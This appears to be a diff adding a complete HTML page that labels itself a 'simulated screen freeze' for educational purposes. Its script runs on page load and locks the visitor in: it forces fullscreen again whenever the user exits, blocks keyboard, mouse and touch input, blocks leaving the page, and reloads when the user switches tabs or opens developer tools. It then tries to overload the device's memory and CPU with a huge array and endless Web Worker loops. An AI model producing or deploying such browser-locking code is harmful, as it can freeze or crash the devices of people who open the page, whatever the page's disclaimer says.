@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚠️ WARNING ⚠️</title>
+    <style>
+        /* Lock down the entire screen */
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        /* Disable pointer events */
+        * {
+            pointer-events: none;
+        }
+
+        /* Warning message styling */
+        .warning {
+            border: 2px solid red;
+            padding: 20px;
+            border-radius: 10px;
+            background-color: #222;
+        }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        <h1>⚠️ WARNING ⚠️</h1>
+        <p>This is a simulated screen freeze and extreme lag for educational and testing purposes only.</p>
+        <p>Your device is temporarily locked and will experience severe lag.</p>
+    </div>
+
+    <script>
+        // ==== Glitchy Background Sounds ====
+        function createGlitchSound() {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+
+            oscillator.type = 'square'; // Glitchy sound
+            oscillator.frequency.setValueAtTime(440, audioContext.currentTime); // Base frequency
+            gainNode.gain.setValueAtTime(0.5, audioContext.currentTime); // Volume
+
+            // Randomly modulate frequency for glitch effect
+            setInterval(() => {
+                oscillator.frequency.setValueAtTime(Math.random() * 1000, audioContext.currentTime);
+            }, 100);
+
+            // Randomly modulate volume for glitch effect
+            setInterval(() => {
+                gainNode.gain.setValueAtTime(Math.random() * 0.5, audioContext.currentTime);
+            }, 50);
+
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            oscillator.start();
+        }
+
+        // Start glitchy sounds
+        createGlitchSound();
+
+        // ==== Prevent Mouse Movement ====
+        document.addEventListener('mousemove', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            // Forcefully move the mouse to the center of the screen
+            const centerX = window.innerWidth / 2;
+            const centerY = window.innerHeight / 2;
+            window.moveTo(centerX, centerY);
+        });
+
+        // ==== Disable Keyboard Input ====
+        document.addEventListener('keydown', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+        });
+
+        // ==== Prevent Right-Click ====
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        // ==== Prevent Navigation ====
+        window.onbeforeunload = function() {
+            return "You cannot leave this page.";
+        };
+
+        // ==== Force Fullscreen ====
+        function requestFullscreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.mozRequestFullScreen) { // Firefox
+                document.documentElement.mozRequestFullScreen();
+            } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari, Opera
+                document.documentElement.webkitRequestFullscreen();
+            } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
+                document.documentElement.msRequestFullscreen();
+            }
+        }
+
+        // Request fullscreen on page load
+        requestFullscreen();
+
+        // ==== Prevent Exiting Fullscreen ====
+        document.addEventListener('fullscreenchange', function() {
+            if (!document.fullscreenElement) {
+                requestFullscreen();
+            }
+        });
+
+        // ==== Disable Touch Input (Mobile Devices) ====
+        document.addEventListener('touchstart', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+        });
+
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+        });
+
+        document.addEventListener('touchend', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+        });
+
+        // ==== Disable Pointer Events ====
+        document.addEventListener('pointerdown', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+        });
+
+        document.addEventListener('pointermove', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+        });
+
+        // ==== Prevent Tab Switching ====
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                window.location.reload(); // Reload the page if the user switches tabs
+            }
+        });
+
+        // ==== Continuously Refocus the Window ====
+        window.onblur = function() {
+            window.focus();
+        };
+
+        // ==== Prevent Console Access ====
+        console.log = function() {};
+        console.warn = function() {};
+        console.error = function() {};
+        console.clear();
+
+        // ==== Prevent Developer Tools ====
+        setInterval(function() {
+            if (window.outerWidth - window.innerWidth > 100 || window.outerHeight - window.innerHeight > 100) {
+                window.location.reload(); // Reload the page if the developer tools are opened
+            }
+        }, 1000);
+
+        // ==== Induce Extreme Lag ====
+        function induceExtremeLag() {
+            // Create a massive array to consume memory
+            const massiveArray = [];
+            for (let i = 0; i < 1e8; i++) {
+                massiveArray.push(new Array(1000).fill('extreme lag'));
+            }
+
+            // Continuously perform heavy computations
+            setInterval(() => {
+                for (let i = 0; i < massiveArray.length; i++) {
+                    massiveArray[i].sort(() => Math.random() - 0.5);
+                }
+            }, 10);
+
+            // Continuously create and remove DOM elements
+            setInterval(() => {
+                const div = document.createElement('div');
+                div.style.position = 'absolute';
+                div.style.top = Math.random() * window.innerHeight + 'px';
+                div.style.left = Math.random() * window.innerWidth + 'px';
+                div.style.width = '100px';
+                div.style.height = '100px';
+                div.style.backgroundColor = 'red';
+                document.body.appendChild(div);
+                setTimeout(() => div.remove(), 100);
+            }, 10);
+
+            // Continuously create Web Workers to overload the CPU
+            setInterval(() => {
+                for (let i = 0; i < 10; i++) {
+                    const worker = new Worker(URL.createObjectURL(new Blob([`
+                        while (true) {}
+                    `])));
+                }
+            }, 1000);
+        }
+
+        // Start inducing extreme lag
+        induceExtremeLag();
+    </script>
+</body>
+</html>
